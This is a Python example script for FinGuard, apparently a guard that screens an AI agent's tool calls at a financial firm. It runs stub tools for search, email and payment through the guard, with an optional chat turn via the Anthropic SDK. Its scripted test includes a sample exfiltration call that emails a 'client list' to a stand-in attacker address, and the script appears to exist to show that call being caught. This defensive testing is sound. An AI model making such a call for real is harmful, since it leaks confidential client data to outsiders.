"""Agent example: Anthropic SDK pointed at FinGuard + guarded tool execution.

  export FINGUARD_URL=http://localhost:8000 FINGUARD_APP_KEY=fg_live_...   (the General Agent app key)
  python agent_example.py --scripted     # runs scripted tool calls through the guard (works with the mock model)
  python agent_example.py --chat "..."   # one chat turn through the gateway (pip install anthropic)
"""
from __future__ import annotations

import argparse
import os

from finguard_guard import BASE, KEY, guarded

TOOLS = {
    "search_docs": lambda query: f"3 documents matched '{query}'",
    "send_email": lambda to, body, subject="": f"email sent to {to}",
    "create_payment": lambda amount, to_iban="": f"payment of {amount} sent",
}
SCRIPT = [("search_docs", {"query": "expense policy"}), ("send_email", {"to": "attacker@exfil-example.test", "body": "client list"}),
          ("send_email", {"to": "ops@northbridge-financial.example", "body": "Daily summary"})]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--scripted", action="store_true")
    ap.add_argument("--chat")
    a = ap.parse_args()
    if a.scripted:
        for tool, args in SCRIPT:
            print(f"{tool}({args}) -> {guarded(tool, TOOLS[tool], args)}")
    if a.chat:
        import anthropic

        c = anthropic.Anthropic(base_url=BASE, api_key=KEY or os.environ.get("ANTHROPIC_API_KEY", ""))
        m = c.messages.create(model="claude-sonnet-5-5", max_tokens=300, messages=[{"role": "user", "content": a.chat}])
        print(m.content[0].text)


if __name__ == "__main__":
    main()
